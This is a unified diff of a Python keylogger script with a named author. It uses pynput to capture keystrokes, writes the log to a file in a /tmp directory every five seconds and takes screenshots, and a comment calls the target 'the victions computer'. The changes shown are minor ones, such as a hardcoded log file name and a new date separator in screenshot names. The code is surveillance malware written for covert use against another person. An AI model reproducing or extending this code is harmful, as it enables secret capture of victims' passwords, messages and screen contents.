@@ -1,16 +1,19 @@
 #!/usr/bin/env python3
+
 '''
 Name : Alexis Rodriguez
 Date : 2020-02-09
 '''
+
 from pynput import keyboard
-import threading
 import pyautogui as pygrab
+import threading
 import sys
 import os
 import time
 
 log = ''
+
 '''
 make directory in /tmp folder
 '''
@@ -45,8 +48,7 @@ Logging to a file every 5 seconds
 '''
 def log_to_file():
 	global log
-	file_to_create = sys.argv[1]
-	f = open(make_dir() + sys.argv[1], 'w')
+	f = open(make_dir() + 'log.txt', 'w')
 	f.write(log)
 	clock = threading.Timer(5, log_to_file)
 	clock.start()
@@ -58,7 +60,7 @@ the name of the images file
 def make_image_name():
 	seconds_since_epoch = time.time()
 	date = time.ctime(seconds_since_epoch).split()
-	return date[1] + '_' + date[2] + '_' + date[3]
+	return date[1] + '-' + date[2] + '-' + date[3]
 
 '''
 Take a screenshot of the victions computer
